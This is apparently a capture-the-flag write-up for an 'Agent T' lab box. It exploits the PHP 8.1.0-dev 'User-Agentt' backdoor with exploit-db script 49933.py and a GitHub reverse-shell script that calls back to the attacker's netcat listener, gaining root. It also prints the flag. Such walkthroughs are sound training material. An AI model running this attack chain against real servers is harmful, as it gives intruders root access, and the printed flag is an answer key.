
---

# Agent T

IP = `10.10.147.31`

Hint : Look closely at the HTTP headers when you request the first page...
### Nmap 

```
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

### Curl

```
# curl -I 10.10.250.25
HTTP/1.1 200 OK
Host: 10.10.250.25
Date: Tue, 13 Aug 2024 12:12:00 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```


### Initial Foothold

```
# searchsploit php 8.1.0-dev
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution         | php/webapps/49933.py
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

and there is also `https://github.com/flast101/php-8.1.0-dev-backdoor-rce`

*first method* :

`searchsploit -m php/webapps/49933.py`

```
# python3 49933.py
Enter the full host url:
http://10.10.250.25/

Interactive shell is opened on http://10.10.250.25/
Can't acces tty; job crontol turned off.
$ id
uid=0(root) gid=0(root) groups=0(root)
$
```


*second method*:

```
$ git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
$ cd php-8.1.0-dev-backdoor-rce
$ python3 revshell_php_8.1.0-dev.py http://10.10.250.25 10.6.101.54 9999
```

```
# nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.6.101.54] from (UNKNOWN) [10.10.250.25] 52502
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3f8655e43931:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@3f8655e43931:/var/www/html#
```

`flag.txt` is in `/` directory

`cat /flag.txt`

**flag**:
`flag{4127d0530abf16d6d23973e3df8dbecb}`

